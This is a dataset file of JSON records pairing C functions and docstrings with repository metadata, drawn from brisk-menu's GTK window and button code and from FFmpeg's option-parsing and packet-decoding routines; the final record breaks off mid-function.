{"docstring": "/**\n * Handle constructor specifics for our button\n */\n", "func_signal": "static void brisk_dash_entry_button_constructed(GObject *obj)", "code": "{\n        BriskDashEntryButton *self = NULL;\n        const GIcon *icon = NULL;\n\n        self = BRISK_DASH_ENTRY_BUTTON(obj);\n\n        icon = brisk_item_get_icon(BRISK_MENU_ENTRY_BUTTON(self)->item);\n        if (icon) {\n                gtk_image_set_from_gicon(GTK_IMAGE(self->image),\n                                         (GIcon *)icon,\n                                         GTK_ICON_SIZE_LARGE_TOOLBAR);\n        } else {\n                gtk_image_set_from_icon_name(GTK_IMAGE(self->image),\n                                             \"image-missing\",\n                                             GTK_ICON_SIZE_LARGE_TOOLBAR);\n        }\n\n        gtk_image_set_pixel_size(GTK_IMAGE(self->image), 64);\n\n        /* Determine our label based on the app */\n        gtk_label_set_label(GTK_LABEL(self->label),\n                            brisk_item_get_name(BRISK_MENU_ENTRY_BUTTON(self)->item));\n        gtk_widget_set_tooltip_text(GTK_WIDGET(self),\n                                    brisk_item_get_summary(BRISK_MENU_ENTRY_BUTTON(self)->item));\n\n        G_OBJECT_CLASS(brisk_dash_entry_button_parent_class)->constructed(obj);\n}", "path": "src\\frontend\\dash\\dash-entry-button.c", "repo_name": "solus-project/brisk-menu", "stars": 140, "license": "gpl-2.0", "language": "c", "size": 1332}
{"docstring": "/**\n * brisk_dash_entry_button_class_init:\n *\n * Handle class initialisation\n */\n", "func_signal": "static void brisk_dash_entry_button_class_init(BriskDashEntryButtonClass *klazz)", "code": "{\n        GObjectClass *obj_class = G_OBJECT_CLASS(klazz);\n\n        /* gobject vtable hookup */\n        obj_class->constructed = brisk_dash_entry_button_constructed;\n        obj_class->dispose = brisk_dash_entry_button_dispose;\n}", "path": "src\\frontend\\dash\\dash-entry-button.c", "repo_name": "solus-project/brisk-menu", "stars": 140, "license": "gpl-2.0", "language": "c", "size": 1332}
{"docstring": "/**\n * Create the graphical buttons for session control\n */\n", "func_signal": "static void brisk_classic_window_setup_session_controls(BriskClassicWindow *self)", "code": "{\n        GtkWidget *widget = NULL;\n        GtkWidget *box = NULL;\n        GtkStyleContext *style = NULL;\n\n        box = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 0);\n        gtk_widget_set_margin_bottom(box, 4);\n\n        gtk_box_pack_end(GTK_BOX(self->sidebar_wrap), box, FALSE, FALSE, 0);\n        gtk_widget_set_halign(box, GTK_ALIGN_CENTER);\n\n        /* Add a separator for visual consistency */\n        widget = gtk_separator_new(GTK_ORIENTATION_HORIZONTAL);\n        gtk_box_pack_end(GTK_BOX(self->sidebar_wrap), widget, FALSE, FALSE, 3);\n\n        /* Logout */\n        widget = gtk_button_new_from_icon_name(\"brisk_system-log-out-symbolic\", GTK_ICON_SIZE_MENU);\n        self->button_logout = widget;\n        g_signal_connect_swapped(widget, \"clicked\", G_CALLBACK(brisk_menu_window_logout), self);\n        gtk_widget_set_tooltip_text(widget, _(\"End the current session\"));\n        gtk_widget_set_can_focus(widget, FALSE);\n        gtk_container_add(GTK_CONTAINER(box), widget);\n        style = gtk_widget_get_style_context(widget);\n        gtk_style_context_add_class(style, GTK_STYLE_CLASS_FLAT);\n        gtk_style_context_add_class(style, \"session-button\");\n\n        /* Lock */\n        widget = gtk_button_new_from_icon_name(\"system-lock-screen-symbolic\",\n                                               GTK_ICON_SIZE_SMALL_TOOLBAR);\n        self->button_lock = widget;\n        g_signal_connect_swapped(widget, \"clicked\", G_CALLBACK(brisk_menu_window_lock), self);\n        gtk_widget_set_tooltip_text(widget, _(\"Lock the screen\"));\n        gtk_widget_set_can_focus(widget, FALSE);\n        gtk_container_add(GTK_CONTAINER(box), widget);\n        style = gtk_widget_get_style_context(widget);\n        gtk_style_context_add_class(style, GTK_STYLE_CLASS_FLAT);\n        gtk_style_context_add_class(style, \"session-button\");\n\n        /* Shutdown */\n        widget =\n            gtk_button_new_from_icon_name(\"system-shutdown-symbolic\", GTK_ICON_SIZE_SMALL_TOOLBAR);\n        self->button_shutdown = widget;\n        g_signal_connect_swapped(widget, \"clicked\", G_CALLBACK(brisk_menu_window_shutdown), self);\n        gtk_widget_set_tooltip_text(widget, _(\"Turn off the device\"));\n        gtk_widget_set_can_focus(widget, FALSE);\n        gtk_container_add(GTK_CONTAINER(box), widget);\n        style = gtk_widget_get_style_context(widget);\n        gtk_style_context_add_class(style, GTK_STYLE_CLASS_FLAT);\n        gtk_style_context_add_class(style, \"session-button\");\n}", "path": "src\\frontend\\classic\\classic-window.c", "repo_name": "solus-project/brisk-menu", "stars": 140, "license": "gpl-2.0", "language": "c", "size": 1332}
{"docstring": "/**\n * brisk_classic_window_associate_category:\n *\n * This will hook up the category button for events to enable us to filter the\n * list based on the active category.\n */\n", "func_signal": "static void brisk_classic_window_associate_category(BriskMenuWindow *self, GtkWidget *button)", "code": "{\n        g_signal_connect_swapped(button,\n                                 \"toggled\",\n                                 G_CALLBACK(brisk_classic_window_on_toggled),\n                                 self);\n        g_signal_connect_swapped(button,\n                                 \"enter-notify-event\",\n                                 G_CALLBACK(brisk_classic_window_on_enter),\n                                 self);\n}", "path": "src\\frontend\\classic\\classic-window.c", "repo_name": "solus-project/brisk-menu", "stars": 140, "license": "gpl-2.0", "language": "c", "size": 1332}
{"docstring": "/**\n * Backend has a new sidebar section for us\n */\n", "func_signal": "static void brisk_classic_window_add_section(BriskMenuWindow *self, BriskSection *section,\n                                             __brisk_unused__ BriskBackend *backend)", "code": "{\n        GtkWidget *button = NULL;\n        const gchar *section_id = brisk_section_get_id(section);\n        GtkWidget *box_target = NULL;\n\n        /* Skip dupes. Sections are uniquely namespaced */\n        if (g_hash_table_lookup(self->item_store, section_id) != NULL) {\n                return;\n        }\n\n        box_target = brisk_menu_window_get_section_box(self, backend);\n\n        button = brisk_classic_category_button_new(section);\n        gtk_radio_button_join_group(GTK_RADIO_BUTTON(button),\n                                    GTK_RADIO_BUTTON(self->section_box_leader));\n        gtk_box_pack_start(GTK_BOX(box_target), button, FALSE, FALSE, 0);\n        brisk_classic_window_associate_category(self, button);\n        gtk_widget_show_all(button);\n\n        /* Avoid new dupes */\n        g_hash_table_insert(self->item_store, g_strdup(section_id), button);\n\n        brisk_menu_window_select_sections(self);\n}", "path": "src\\frontend\\classic\\classic-window.c", "repo_name": "solus-project/brisk-menu", "stars": 140, "license": "gpl-2.0", "language": "c", "size": 1332}
{"docstring": "/**\n * Fired by clicking a category button\n */\n", "func_signal": "static void brisk_classic_window_on_toggled(BriskMenuWindow *self, GtkWidget *button)", "code": "{\n        BriskClassicCategoryButton *cat = NULL;\n\n        /* Skip a double signal due to using a group */\n        if (!gtk_toggle_button_get_active(GTK_TOGGLE_BUTTON(button))) {\n                return;\n        }\n\n        cat = BRISK_CLASSIC_CATEGORY_BUTTON(button);\n        g_object_get(cat, \"section\", &self->active_section, NULL);\n\n        /* Start the filter. */\n        brisk_classic_window_invalidate_filter(self, NULL);\n}", "path": "src\\frontend\\classic\\classic-window.c", "repo_name": "solus-project/brisk-menu", "stars": 140, "license": "gpl-2.0", "language": "c", "size": 1332}
{"docstring": "/**\n * brisk_classic_window_filter_apps:\n *\n * Responsible for filtering the selection based on active group or search\n * term.\n */\n", "func_signal": "__brisk_pure__ static gboolean brisk_classic_window_filter_apps(GtkListBoxRow *row, gpointer v)", "code": "{\n        BriskMenuWindow *self = NULL;\n        GtkWidget *child = NULL;\n\n        self = BRISK_MENU_WINDOW(v);\n\n        if (!self->filtering) {\n                return FALSE;\n        }\n\n        /* Grab our Entry widget */\n        child = gtk_bin_get_child(GTK_BIN(row));\n\n        return brisk_menu_window_filter_apps(self, child);\n}", "path": "src\\frontend\\classic\\classic-window.c", "repo_name": "solus-project/brisk-menu", "stars": 140, "license": "gpl-2.0", "language": "c", "size": 1332}
{"docstring": "/**\n * Update the position of the search bar in accordance with settings\n */\n", "func_signal": "static void brisk_classic_window_update_search(BriskMenuWindow *self)", "code": "{\n        SearchPosition search_position = self->search_position;\n        GtkWidget *layout = NULL;\n        gint n_pos = 0;\n\n        layout = gtk_bin_get_child(GTK_BIN(self));\n\n        if (search_position < SEARCH_POS_MIN || search_position >= SEARCH_POS_MAX) {\n                search_position = SEARCH_POS_AUTOMATIC;\n        }\n\n        switch (search_position) {\n        case SEARCH_POS_AUTOMATIC:\n                /* Top panel, bottom search. Bottom panel, top search */\n                n_pos = self->position == GTK_POS_TOP ? 1 : 0;\n                break;\n        case SEARCH_POS_TOP:\n                n_pos = 0;\n                break;\n        case SEARCH_POS_BOTTOM:\n        default:\n                n_pos = 1;\n                break;\n        }\n\n        gtk_container_child_set(GTK_CONTAINER(layout), self->search, \"position\", n_pos, NULL);\n}", "path": "src\\frontend\\classic\\classic-window.c", "repo_name": "solus-project/brisk-menu", "stars": 140, "license": "gpl-2.0", "language": "c", "size": 1332}
{"docstring": "/**\n * brisk_dash_entry_button_init:\n *\n * Handle construction of the BriskDashEntryButton\n */\n", "func_signal": "static void brisk_dash_entry_button_init(BriskDashEntryButton *self)", "code": "{\n        GtkStyleContext *style = NULL;\n        GtkWidget *label = NULL;\n        GtkWidget *image = NULL;\n        GtkWidget *layout = NULL;\n\n        /* Main layout */\n        layout = gtk_box_new(GTK_ORIENTATION_VERTICAL, 0);\n        gtk_container_add(GTK_CONTAINER(self), layout);\n\n        /* Image on the left */\n        image = gtk_image_new();\n        self->image = image;\n        gtk_widget_set_margin_bottom(image, 7);\n        gtk_box_pack_start(GTK_BOX(layout), image, FALSE, FALSE, 0);\n\n        /* Display label */\n        label = gtk_label_new(\"\");\n        self->label = label;\n        gtk_label_set_lines(GTK_LABEL(label), 2);\n        gtk_label_set_ellipsize(GTK_LABEL(label), PANGO_ELLIPSIZE_END);\n        gtk_label_set_max_width_chars(GTK_LABEL(label), 15);\n        gtk_label_set_line_wrap(GTK_LABEL(label), TRUE);\n        g_object_set(self->label,\n                     \"halign\",\n                     GTK_ALIGN_CENTER,\n                     \"valign\",\n                     GTK_ALIGN_START,\n                     \"justify\",\n                     GTK_JUSTIFY_CENTER,\n                     NULL);\n        gtk_box_pack_start(GTK_BOX(layout), label, TRUE, TRUE, 0);\n\n        /* Button specific fixes */\n        gtk_button_set_relief(GTK_BUTTON(self), GTK_RELIEF_NONE);\n        gtk_widget_set_can_focus(GTK_WIDGET(self), FALSE);\n\n        /* Flatten the button */\n        style = gtk_widget_get_style_context(GTK_WIDGET(self));\n        gtk_style_context_add_class(style, GTK_STYLE_CLASS_FLAT);\n\n        gtk_widget_show_all(layout);\n}", "path": "src\\frontend\\dash\\dash-entry-button.c", "repo_name": "solus-project/brisk-menu", "stars": 140, "license": "gpl-2.0", "language": "c", "size": 1332}
{"docstring": "/**\n * Backend has new items for us, add to the global store\n */\n", "func_signal": "static void brisk_classic_window_add_item(BriskMenuWindow *self, BriskItem *item,\n                                          __brisk_unused__ BriskBackend *backend)", "code": "{\n        GtkWidget *button = NULL;\n        const gchar *item_id = brisk_item_get_id(item);\n\n        button = brisk_classic_entry_button_new(self->launcher, item);\n        g_signal_connect_swapped(button,\n                                 \"show-context-menu\",\n                                 G_CALLBACK(brisk_menu_window_show_context),\n                                 self);\n        gtk_container_add(GTK_CONTAINER(BRISK_CLASSIC_WINDOW(self)->apps), button);\n        gtk_widget_show_all(button);\n\n        g_hash_table_insert(self->item_store, g_strdup(item_id), button);\n}", "path": "src\\frontend\\classic\\classic-window.c", "repo_name": "solus-project/brisk-menu", "stars": 140, "license": "gpl-2.0", "language": "c", "size": 1332}
{"docstring": "/**\n * brisk_classic_window_init:\n *\n * Handle construction of the BriskClassicWindow\n */\n", "func_signal": "static void brisk_classic_window_init(BriskClassicWindow *self)", "code": "{\n        GtkWidget *layout = NULL;\n        GtkWidget *widget = NULL;\n        GtkWidget *content = NULL;\n        GtkWidget *scroll = NULL;\n        GtkStyleContext *style = NULL;\n        BriskMenuWindow *base;\n        autofree(gchar) *txt_holder = NULL;\n        autofree(gchar) *place_holder = NULL;\n\n        brisk_classic_window_load_css(self);\n\n        base = BRISK_MENU_WINDOW(self);\n\n        style = gtk_widget_get_style_context(GTK_WIDGET(self));\n        gtk_style_context_add_class(style, BRISK_STYLE_MAIN);\n\n        brisk_menu_window_configure_grabs(base);\n\n        layout = gtk_box_new(GTK_ORIENTATION_VERTICAL, 2);\n        gtk_container_add(GTK_CONTAINER(self), layout);\n\n        /* Create search entry - but not GtkSearchEntry to avoid rounding in themes */\n        widget = gtk_entry_new();\n        gtk_entry_set_icon_from_icon_name(GTK_ENTRY(widget),\n                                          GTK_ENTRY_ICON_PRIMARY,\n                                          \"edit-find-symbolic\");\n        gtk_entry_set_icon_from_icon_name(GTK_ENTRY(widget),\n                                          GTK_ENTRY_ICON_SECONDARY,\n                                          \"edit-clear-symbolic\");\n\n        gtk_box_pack_start(GTK_BOX(layout), widget, FALSE, FALSE, 0);\n        /* Translators: This is the text shown in the \"search box\" with no content */\n        txt_holder = g_strdup_printf(\"%s\\u2026\", _(\"Type to search\"));\n        gtk_entry_set_placeholder_text(GTK_ENTRY(widget), txt_holder);\n        base->search = widget;\n        g_signal_connect_swapped(widget, \"changed\", G_CALLBACK(brisk_menu_window_search), self);\n        g_signal_connect_swapped(widget,\n                                 \"activate\",\n                                 G_CALLBACK(brisk_classic_window_key_activate),\n                                 self);\n        g_signal_connect(widget, \"icon-press\", G_CALLBACK(brisk_menu_window_clear_search), self);\n\n        /* Content layout */\n        content = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 2);\n        gtk_box_pack_start(GTK_BOX(layout), content, TRUE, TRUE, 0);\n\n        /* Sidebar for categories */\n        widget = gtk_box_new(GTK_ORIENTATION_VERTICAL, 0);\n        scroll = brisk_menu_sidebar_scroller_new();\n        base->section_box_holder = widget;\n        style = gtk_widget_get_style_context(base->section_box_holder);\n        gtk_style_context_add_class(style, BRISK_STYLE_SIDEBAR);\n        self->sidebar_scroll = scroll;\n        gtk_container_add(GTK_CONTAINER(scroll), widget);\n\n        /* Create a wrapper for the categories */\n        widget = gtk_box_new(GTK_ORIENTATION_VERTICAL, 0);\n        gtk_box_pack_start(GTK_BOX(widget), scroll, TRUE, TRUE, 0);\n        gtk_box_pack_start(GTK_BOX(content), widget, TRUE, TRUE, 0);\n        self->sidebar_wrap = widget;\n\n        /* Scrollbar for apps */\n        scroll = gtk_scrolled_window_new(NULL, NULL);\n        gtk_scrolled_window_set_shadow_type(GTK_SCROLLED_WINDOW(scroll), GTK_SHADOW_IN);\n        gtk_box_pack_start(GTK_BOX(content), scroll, TRUE, TRUE, 0);\n        gtk_scrolled_window_set_policy(GTK_SCROLLED_WINDOW(scroll),\n                                       GTK_POLICY_NEVER,\n                                       GTK_POLICY_AUTOMATIC);\n        gtk_scrolled_window_set_overlay_scrolling(GTK_SCROLLED_WINDOW(scroll), FALSE);\n        self->apps_scroll = scroll;\n\n        /* Application launcher display */\n        widget = gtk_list_box_new();\n        gtk_container_add(GTK_CONTAINER(scroll), widget);\n        self->apps = widget;\n        gtk_list_box_set_activate_on_single_click(GTK_LIST_BOX(self->apps), TRUE);\n        gtk_list_box_set_selection_mode(GTK_LIST_BOX(self->apps), GTK_SELECTION_SINGLE);\n        g_signal_connect_swapped(self->apps,\n                                 \"row-activated\",\n                                 G_CALLBACK(brisk_classic_window_activated),\n                                 self);\n\n        /* Style up the app box */\n        style = gtk_widget_get_style_context(widget);\n        gtk_style_context_add_class(style, BRISK_STYLE_APPS_LIST);\n        gtk_style_context_add_class(style, \"view\");\n        gtk_style_context_add_class(style, \"content-view\");\n        gtk_style_context_remove_class(style, \"background\");\n\n        /* Translators: This message is shown when the search results are empty */\n        place_holder = g_strdup_printf(\"<big>%s</big>\", _(\"Sorry, no items found\"));\n        widget = gtk_label_new(place_holder);\n        /* Add a placeholder when there are no apps for current search term */\n        gtk_label_set_use_markup(GTK_LABEL(widget), TRUE);\n        g_object_set(widget,\n                     \"halign\",\n                     GTK_ALIGN_CENTER,\n                     \"valign\",\n                     GTK_ALIGN_START,\n                     \"margin\",\n                     6,\n                     NULL);\n        style = gtk_widget_get_style_context(widget);\n        gtk_style_context_add_class(style, \"dim-label\");\n        gtk_list_box_set_placeholder(GTK_LIST_BOX(self->apps), widget);\n        gtk_widget_show_all(widget);\n\n        brisk_classic_window_setup_session_controls(self);\n\n        gtk_window_set_default_size(GTK_WINDOW(self), 300, 510);\n\n        /* Hook up keyboard events */\n        g_signal_connect(self,\n                         \"key-release-event\",\n                         G_CALLBACK(brisk_menu_window_key_release),\n                         NULL);\n        g_signal_connect(self, \"key-press-event\", G_CALLBACK(brisk_menu_window_key_press), NULL);\n\n        brisk_classic_window_build_sidebar(base);\n\n        brisk_menu_window_init_backends(base);\n\n        /* Hook up dbus later on */\n        g_idle_add((GSourceFunc)brisk_menu_window_setup_session, self);\n\n        gtk_widget_show_all(layout);\n}", "path": "src\\frontend\\classic\\classic-window.c", "repo_name": "solus-project/brisk-menu", "stars": 140, "license": "gpl-2.0", "language": "c", "size": 1332}
{"docstring": "/**\n * A backend needs us to invalidate the filters\n */\n", "func_signal": "static void brisk_classic_window_invalidate_filter(BriskMenuWindow *self,\n                                                   __brisk_unused__ BriskBackend *backend)", "code": "{\n        gtk_list_box_invalidate_filter(GTK_LIST_BOX(BRISK_CLASSIC_WINDOW(self)->apps));\n        gtk_list_box_invalidate_sort(GTK_LIST_BOX(BRISK_CLASSIC_WINDOW(self)->apps));\n}", "path": "src\\frontend\\classic\\classic-window.c", "repo_name": "solus-project/brisk-menu", "stars": 140, "license": "gpl-2.0", "language": "c", "size": 1332}
{"docstring": "/*\n * brisk_classic_window_new:\n *\n * Return a newly created BriskClassicWindow\n */\n", "func_signal": "BriskMenuWindow *brisk_classic_window_new(GtkWidget *relative_to)", "code": "{\n        return g_object_new(BRISK_TYPE_CLASSIC_WINDOW,\n                            \"type\",\n                            GTK_WINDOW_POPUP,\n                            \"relative-to\",\n                            relative_to,\n                            NULL);\n}", "path": "src\\frontend\\classic\\classic-window.c", "repo_name": "solus-project/brisk-menu", "stars": 140, "license": "gpl-2.0", "language": "c", "size": 1332}
{"docstring": "/* Add all the streams from the given input file to the global\n * list of input streams. */\n", "func_signal": "static void add_input_streams(OptionsContext *o, AVFormatContext *ic)", "code": "{\n    int i, ret;\n\n    for (i = 0; i < ic->nb_streams; i++) {\n        AVStream *st = ic->streams[i];\n        AVCodecContext *dec = st->codec;\n        InputStream *ist = av_mallocz(sizeof(*ist));\n        char *framerate = NULL, *hwaccel = NULL, *hwaccel_device = NULL;\n        char *codec_tag = NULL;\n        char *next;\n        char *discard_str = NULL;\n        const AVOption *discard_opt = av_opt_find(dec, \"skip_frame\", NULL, 0, 0);\n\n        if (!ist)\n            exit_program(1);\n\n        GROW_ARRAY(input_streams, nb_input_streams);\n        input_streams[nb_input_streams - 1] = ist;\n\n        ist->st = st;\n        ist->file_index = nb_input_files;\n        ist->discard = 1;\n        st->discard  = AVDISCARD_ALL;\n        ist->nb_samples = 0;\n        ist->min_pts = INT64_MAX;\n        ist->max_pts = INT64_MIN;\n\n        ist->ts_scale = 1.0;\n        MATCH_PER_STREAM_OPT(ts_scale, dbl, ist->ts_scale, ic, st);\n\n        ist->autorotate = 1;\n        MATCH_PER_STREAM_OPT(autorotate, i, ist->autorotate, ic, st);\n\n        MATCH_PER_STREAM_OPT(codec_tags, str, codec_tag, ic, st);\n        if (codec_tag) {\n            uint32_t tag = strtol(codec_tag, &next, 0);\n            if (*next)\n                tag = AV_RL32(codec_tag);\n            st->codec->codec_tag = tag;\n        }\n\n        ist->dec = choose_decoder(o, ic, st);\n        ist->decoder_opts = filter_codec_opts(o->g->codec_opts, ist->st->codec->codec_id, ic, st, ist->dec);\n\n        ist->reinit_filters = -1;\n        MATCH_PER_STREAM_OPT(reinit_filters, i, ist->reinit_filters, ic, st);\n\n        MATCH_PER_STREAM_OPT(discard, str, discard_str, ic, st);\n        ist->user_set_discard = AVDISCARD_NONE;\n        if (discard_str && av_opt_eval_int(dec, discard_opt, discard_str, &ist->user_set_discard) < 0) {\n            av_log(NULL, AV_LOG_ERROR, \"Error parsing discard %s.\\n\",\n                    discard_str);\n            exit_program(1);\n        }\n\n        ist->filter_in_rescale_delta_last = AV_NOPTS_VALUE;\n\n        ist->dec_ctx = avcodec_alloc_context3(ist->dec);\n        if (!ist->dec_ctx) {\n            av_log(NULL, AV_LOG_ERROR, \"Error allocating the decoder context.\\n\");\n            exit_program(1);\n        }\n\n        ret = avcodec_copy_context(ist->dec_ctx, dec);\n        if (ret < 0) {\n            av_log(NULL, AV_LOG_ERROR, \"Error initializing the decoder context.\\n\");\n            exit_program(1);\n        }\n\n        switch (dec->codec_type) {\n        case AVMEDIA_TYPE_VIDEO:\n            if(!ist->dec)\n                ist->dec = avcodec_find_decoder(dec->codec_id);\n#if FF_API_EMU_EDGE\n            if (av_codec_get_lowres(dec)) {\n                dec->flags |= CODEC_FLAG_EMU_EDGE;\n            }\n#endif\n\n            ist->resample_height  = ist->dec_ctx->height;\n            ist->resample_width   = ist->dec_ctx->width;\n            ist->resample_pix_fmt = ist->dec_ctx->pix_fmt;\n\n            MATCH_PER_STREAM_OPT(frame_rates, str, framerate, ic, st);\n            if (framerate && av_parse_video_rate(&ist->framerate,\n                                                 framerate) < 0) {\n                av_log(NULL, AV_LOG_ERROR, \"Error parsing framerate %s.\\n\",\n                       framerate);\n                exit_program(1);\n            }\n\n            ist->top_field_first = -1;\n            MATCH_PER_STREAM_OPT(top_field_first, i, ist->top_field_first, ic, st);\n\n            MATCH_PER_STREAM_OPT(hwaccels, str, hwaccel, ic, st);\n            if (hwaccel) {\n                if (!strcmp(hwaccel, \"none\"))\n                    ist->hwaccel_id = HWACCEL_NONE;\n                else if (!strcmp(hwaccel, \"auto\"))\n                    ist->hwaccel_id = HWACCEL_AUTO;\n                else {\n                    int i;\n                    for (i = 0; hwaccels[i].name; i++) {\n                        if (!strcmp(hwaccels[i].name, hwaccel)) {\n                            ist->hwaccel_id = hwaccels[i].id;\n                            break;\n                        }\n                    }\n\n                    if (!ist->hwaccel_id) {\n                        av_log(NULL, AV_LOG_FATAL, \"Unrecognized hwaccel: %s.\\n\",\n                               hwaccel);\n                        av_log(NULL, AV_LOG_FATAL, \"Supported hwaccels: \");\n                        for (i = 0; hwaccels[i].name; i++)\n                            av_log(NULL, AV_LOG_FATAL, \"%s \", hwaccels[i].name);\n                        av_log(NULL, AV_LOG_FATAL, \"\\n\");\n                        exit_program(1);\n                    }\n                }\n            }\n\n            MATCH_PER_STREAM_OPT(hwaccel_devices, str, hwaccel_device, ic, st);\n            if (hwaccel_device) {\n                ist->hwaccel_device = av_strdup(hwaccel_device);\n                if (!ist->hwaccel_device)\n                    exit_program(1);\n            }\n            ist->hwaccel_pix_fmt = AV_PIX_FMT_NONE;\n\n            break;\n        case AVMEDIA_TYPE_AUDIO:\n            ist->guess_layout_max = INT_MAX;\n            MATCH_PER_STREAM_OPT(guess_layout_max, i, ist->guess_layout_max, ic, st);\n            guess_input_channel_layout(ist);\n\n            ist->resample_sample_fmt     = ist->dec_ctx->sample_fmt;\n            ist->resample_sample_rate    = ist->dec_ctx->sample_rate;\n            ist->resample_channels       = ist->dec_ctx->channels;\n            ist->resample_channel_layout = ist->dec_ctx->channel_layout;\n\n            break;\n        case AVMEDIA_TYPE_DATA:\n        case AVMEDIA_TYPE_SUBTITLE: {\n            char *canvas_size = NULL;\n            if(!ist->dec)\n                ist->dec = avcodec_find_decoder(dec->codec_id);\n            MATCH_PER_STREAM_OPT(fix_sub_duration, i, ist->fix_sub_duration, ic, st);\n            MATCH_PER_STREAM_OPT(canvas_sizes, str, canvas_size, ic, st);\n            if (canvas_size &&\n                av_parse_video_size(&ist->dec_ctx->width, &ist->dec_ctx->height, canvas_size) < 0) {\n                av_log(NULL, AV_LOG_FATAL, \"Invalid canvas size: %s.\\n\", canvas_size);\n                exit_program(1);\n            }\n            break;\n        }\n        case AVMEDIA_TYPE_ATTACHMENT:\n        case AVMEDIA_TYPE_UNKNOWN:\n            break;\n        default:\n            abort();\n        }\n    }\n}", "path": "app\\src\\main\\jni\\ffmpeg_opt.c", "repo_name": "codeqian/ffmpegCLDemo", "stars": 175, "license": "None", "language": "c", "size": 118899}
{"docstring": "/* arg format is \"output-stream-index:streamid-value\". */\n", "func_signal": "static int opt_streamid(void *optctx, const char *opt, const char *arg)", "code": "{\n    OptionsContext *o = optctx;\n    int idx;\n    char *p;\n    char idx_str[16];\n\n    av_strlcpy(idx_str, arg, sizeof(idx_str));\n    p = strchr(idx_str, ':');\n    if (!p) {\n        av_log(NULL, AV_LOG_FATAL,\n               \"Invalid value '%s' for option '%s', required syntax is 'index:value'\\n\",\n               arg, opt);\n        exit_program(1);\n    }\n    *p++ = '\\0';\n    idx = parse_number_or_die(opt, idx_str, OPT_INT, 0, MAX_STREAMS-1);\n    o->streamid_map = grow_array(o->streamid_map, sizeof(*o->streamid_map), &o->nb_streamid_map, idx+1);\n    o->streamid_map[idx] = parse_number_or_die(opt, p, OPT_INT, 0, INT_MAX);\n    return 0;\n}", "path": "app\\src\\main\\jni\\ffmpeg_opt.c", "repo_name": "codeqian/ffmpegCLDemo", "stars": 175, "license": "None", "language": "c", "size": 118899}
{"docstring": "/* pkt = NULL means EOF (needed to flush decoder buffers) */\n", "func_signal": "static int process_input_packet(InputStream *ist, const AVPacket *pkt, int no_eof)", "code": "{\n    int ret = 0, i;\n    int got_output = 0;\n\n    AVPacket avpkt;\n    if (!ist->saw_first_ts) {\n        ist->dts = ist->st->avg_frame_rate.num ? - ist->dec_ctx->has_b_frames * AV_TIME_BASE / av_q2d(ist->st->avg_frame_rate) : 0;\n        ist->pts = 0;\n        if (pkt && pkt->pts != AV_NOPTS_VALUE && !ist->decoding_needed) {\n            ist->dts += av_rescale_q(pkt->pts, ist->st->time_base, AV_TIME_BASE_Q);\n            ist->pts = ist->dts; //unused but better to set it to a value thats not totally wrong\n        }\n        ist->saw_first_ts = 1;\n    }\n\n    if (ist->next_dts == AV_NOPTS_VALUE)\n        ist->next_dts = ist->dts;\n    if (ist->next_pts == AV_NOPTS_VALUE)\n        ist->next_pts = ist->pts;\n\n    if (!pkt) {\n        /* EOF handling */\n        av_init_packet(&avpkt);\n        avpkt.data = NULL;\n        avpkt.size = 0;\n        goto handle_eof;\n    } else {\n        avpkt = *pkt;\n    }\n\n    if (pkt->dts != AV_NOPTS_VALUE) {\n        ist->next_dts = ist->dts = av_rescale_q(pkt->dts, ist->st->time_base, AV_TIME_BASE_Q);\n        if (ist->dec_ctx->codec_type != AVMEDIA_TYPE_VIDEO || !ist->decoding_needed)\n            ist->next_pts = ist->pts = ist->dts;\n    }\n\n    // while we have more to decode or while the decoder did output something on EOF\n    while (ist->decoding_needed && (avpkt.size > 0 || (!pkt && got_output))) {\n        int duration;\n    handle_eof:\n\n        ist->pts = ist->next_pts;\n        ist->dts = ist->next_dts;\n\n        if (avpkt.size && avpkt.size != pkt->size &&\n            !(ist->dec->capabilities & AV_CODEC_CAP_SUBFRAMES)) {\n            av_log(NULL, ist->showed_multi_packet_warning ? AV_LOG_VERBOSE : AV_LOG_WARNING,\n                   \"Multiple frames in a packet from stream %d\\n\", pkt->stream_index);\n            ist->showed_multi_packet_warning = 1;\n        }\n\n        switch (ist->dec_ctx->codec_type) {\n        case AVMEDIA_TYPE_AUDIO:\n            ret = decode_audio    (ist, &avpkt, &got_output);\n            break;\n        case AVMEDIA_TYPE_VIDEO:\n            ret = decode_video    (ist, &avpkt, &got_output);\n            if (avpkt.duration) {\n                duration = av_rescale_q(avpkt.duration, ist->st->time_base, AV_TIME_BASE_Q);\n            } else if(ist->dec_ctx->framerate.num != 0 && ist->dec_ctx->framerate.den != 0) {\n                int ticks= av_stream_get_parser(ist->st) ? av_stream_get_parser(ist->st)->repeat_pict+1 : ist->dec_ctx->ticks_per_frame;\n                duration = ((int64_t)AV_TIME_BASE *\n                                ist->dec_ctx->framerate.den * ticks) /\n                                ist->dec_ctx->framerate.num / ist->dec_ctx->ticks_per_frame;\n            } else\n                duration = 0;\n\n            if(ist->dts != AV_NOPTS_VALUE && duration) {\n                ist->next_dts += duration;\n            }else\n                ist->next_dts = AV_NOPTS_VALUE;\n\n            if (got_output)\n                ist->next_pts += duration; //FIXME the duration is not correct in some cases\n            break;\n        case AVMEDIA_TYPE_SUBTITLE:\n            ret = transcode_subtitles(ist, &avpkt, &got_output);\n            break;\n        default:\n            return -1;\n        }\n\n        if (ret < 0) {\n            av_log(NULL, AV_LOG_ERROR, \"Error while decoding stream #%d:%d: %s\\n\",\n                   ist->file_index, ist->st->index, av_err2str(ret));\n            if (exit_on_error)\n                exit_program(1);\n            break;\n        }\n\n        avpkt.dts=\n        avpkt.pts= AV_NOPTS_VALUE;\n\n        // touch data and size only if not EOF\n        if (pkt) {\n            if(ist->dec_ctx->codec_type != AVMEDIA_TYPE_AUDIO)\n                ret = avpkt.size;\n            avpkt.data += ret;\n            avpkt.size -= ret;\n        }\n        if (!got_output) {\n            continue;\n        }\n        if (got_output && !pkt)\n            break;\n    }\n\n    /* after flushing, send an EOF on all the filter inputs attached to the stream */\n    /* except when looping we need to flush but not to send an EOF */\n    if (!pkt && ist->decoding_needed && !got_output && !no_eof) {\n        int ret = send_filter_eof(ist);\n        if (ret < 0) {\n            av_log(NULL, AV_LOG_FATAL, \"Error marking filters as finished\\n\");\n            exit_program(1);\n        }\n    }\n\n    /* handle stream copy */\n    if (!ist->decoding_needed) {\n        ist->dts = ist->next_dts;\n        switch (ist->dec_ctx->codec_type) {\n        case AVMEDIA_TYPE_AUDIO:\n            ist->next_dts += ((int64_t)AV_TIME_BASE * ist->dec_ctx->frame_size) /\n                             ist->dec_ctx->sample_rate;\n  